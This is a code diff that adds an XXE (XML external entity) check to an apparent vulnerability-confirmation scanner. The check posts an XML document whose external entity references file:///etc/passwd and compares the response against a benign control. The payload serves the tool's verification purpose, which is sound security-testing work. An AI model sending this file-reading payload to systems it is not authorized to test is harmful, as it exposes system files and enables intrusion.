@@ -435,3 +435,35 @@ def check_cors(session, hyp, ev_dir, ctx):
                            false_positive_reason=f"Access-Control-Allow-Origin is fixed "
                                                  f"({acao}), not reflected")
     return CheckResult("unconfirmed", endpoint, files=files)
+
+
+_XXE_DOC = ('<?xml version="1.0"?>\n'
+            '<!DOCTYPE root [<!ENTITY {ent} SYSTEM "file:///etc/passwd">]>\n'
+            '<root>&{ent};</root>')
+
+
+@register("XXE")
+def check_xxe(session, hyp, ev_dir, ctx):
+    """XML external entity injection: a parser resolves an external SYSTEM entity, pulling a
+    local file into the response. Confirm by referencing /etc/passwd; a benign control (same
+    doc, no entity) must not leak it. One read-only file reference is proof."""
+    endpoint = hyp["endpoint"]
+    ent = "hb" + secrets.token_hex(3)
+    headers = {"Content-Type": "application/xml"}
+
+    control = session.post(endpoint, raw="<?xml version=\"1.0\"?><root>ok</root>",
+                           headers=headers)
+    inject = session.post(endpoint, raw=_XXE_DOC.format(ent=ent), headers=headers)
+    files = save_evidence(ev_dir, "control-noentity", control)
+    files += save_evidence(ev_dir, "inject-xxe", inject)
+
+    if _PASSWD.search(inject.body) and not _PASSWD.search(control.body):
+        return CheckResult("confirmed", endpoint, "high",
+                           'SYSTEM "file:///etc/passwd"',
+                           "External entity resolved to /etc/passwd (root:...:0:0: present), "
+                           "absent from the entity-free control.", files=files)
+    if f"&{ent};" in inject.body:
+        return CheckResult("false-positive", endpoint, files=files,
+                           false_positive_reason="external entities are not resolved "
+                                                 "(reference returned unexpanded)")
+    return CheckResult("unconfirmed", endpoint, files=files)
